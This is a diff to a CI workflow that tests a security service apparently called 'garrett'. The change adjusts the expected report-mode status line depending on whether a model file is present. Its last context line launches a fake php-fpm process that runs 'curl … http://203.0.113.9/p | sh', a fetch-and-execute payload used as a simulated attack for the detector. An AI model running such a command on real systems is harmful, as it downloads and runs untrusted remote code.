@@ -330,7 +330,9 @@ jobs:
           sudo systemctl restart garrett
           sleep 8
           sudo garrett status | tee /tmp/status.txt
-          grep -q "Mode: report (this machine's configuration asks for report; its service allows kill)" /tmp/status.txt
+          # With the model inside it the service allows decide; without one, kill.
+          if [ -f model/model.onnx ]; then allows=decide; else allows=kill; fi
+          grep -q "Mode: report (this machine's configuration asks for report; its service allows $allows)" /tmp/status.txt
           sudo journalctl -u garrett --no-pager -o cat | grep "reporting to" | tail -1
           sudo journalctl -u garrett --no-pager -o cat | grep -q "mode: report, as this machine's configuration asks"
           /tmp/gv/php-fpm8.3 -c 'sh -c "curl -s -m 120 http://203.0.113.9/p | sh"; true' &
